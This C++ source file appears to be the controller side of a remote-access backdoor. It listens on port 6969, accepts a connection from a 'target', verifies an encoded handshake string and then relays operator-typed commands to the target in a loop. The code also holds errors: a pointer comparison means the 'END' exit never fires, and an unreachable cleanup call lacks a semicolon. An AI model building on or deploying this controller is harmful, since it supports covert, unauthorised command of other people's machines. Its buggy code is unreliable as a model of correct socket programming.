#include "Server.h"

bool Listener::startServer(){
#if defined(_WIN32)
  WSADATA d;
  if(WSAStartup(MAKEWORD(2,2), &d)){
    printf("[-] Failed to initialize winsock.\n");
    return false;
  }
#endif
  printf("[+] Configuring local address...\n");
  /*int port;
  while(true){
    printf("[+] Choose a listening port : ");
    std::cin >> port;
    if(port < 0 || port > 65535){
      printf("[-] Please enter a valid port !\n");
    } else {
      break; 
    }
  }
  const char* portNumber = "" + port;*/
  struct addrinfo hints;
  memset(&hints, 0, sizeof(hints));
  hints.ai_family = AF_INET6;
  hints.ai_socktype = SOCK_STREAM;
  hints.ai_flags = AI_PASSIVE;
  struct addrinfo* bind_address;
  getaddrinfo(0, "6969", &hints, &bind_address);

  printf("[+] Creating socket...\n");
  SOCKET socket_listen;
  socket_listen = socket(bind_address->ai_family, bind_address->ai_socktype, bind_address->ai_protocol);
  if(!ISVALIDSOCKET(socket_listen)){
    printf("[-] Socket initialization failed ! Please try with a different port!");
    return false;
  }

  int option = 0;
  if(setsockopt(socket_listen, IPPROTO_IPV6, IPV6_V6ONLY, (void*)&option, sizeof(option))){
    printf("[-] setsockopt() failed...\n");
    return false;
  }

  printf("[+] Binding socket, to local address...\n");
  if(bind(socket_listen, bind_address->ai_addr, bind_address->ai_addrlen)){
    printf("[-] bind() failed...\n");
    return false;
  }
  freeaddrinfo(bind_address);

  printf("[+] Listening for connections...\n");
  if(listen(socket_listen, 1000) < 0){
    printf("[+] listen() failed...\n");
    return false;
  }
  this->listeningSocket = socket_listen;
  return true;
#if defined(_WIN32)
  WSACleanup()
#endif
}

bool Listener::startAcceptingConnections(){
  printf("[+] Waiting for connections...\n");
  struct sockaddr_storage client_address;
  socklen_t client_len = sizeof(client_address);
  SOCKET socket_client = accept(this->listeningSocket, (struct sockaddr*)&client_address, &client_len);
  if(!ISVALIDSOCKET(socket_client)){
    printf("[-] accept() failed...\n");
    return false;
  }

  printf("[+] Client is connected...\n");
  this->clientSocket = socket_client;
  return true;
}

void Listener::startCommunication(){
  char okMessage[4096];
  int okSignal = recv(this->clientSocket, okMessage, 4096, 0);
  if(okSignal <= 1){
    printf("[-] Connection closed by peer...\n");
    return;
  }
  std::string signalMSG = okMessage;
  signalMSG.pop_back();
  std::string startMessage = "R2t5IHZ5dHVqIGRraWdrcWMgcWJ5Z2t5aSB1bmZ1aHl1ZGp5cSB0ZXN1aiBna3lpIGRlZCBzZWR2a2R0dWRqa2gu";
  if(signalMSG != startMessage){
    std::cout<<"[+] Target is not alive."<<std::endl;
    return;
  }
  printf("[+] Target is alive... You can start interacting with the target.\n");
  std::cout<<"[SEND COMMAND TO TARGET 'HELP' TO PRINT HELP]"<<std::endl;
  char command2Target[4096];
  while(true){
    std::cout<<">> ";
    std::cin>>command2Target;
    if(command2Target != "END"){
      send(clientSocket, command2Target, strlen(command2Target), 0);
    } else {
      break;
    }
  }
}
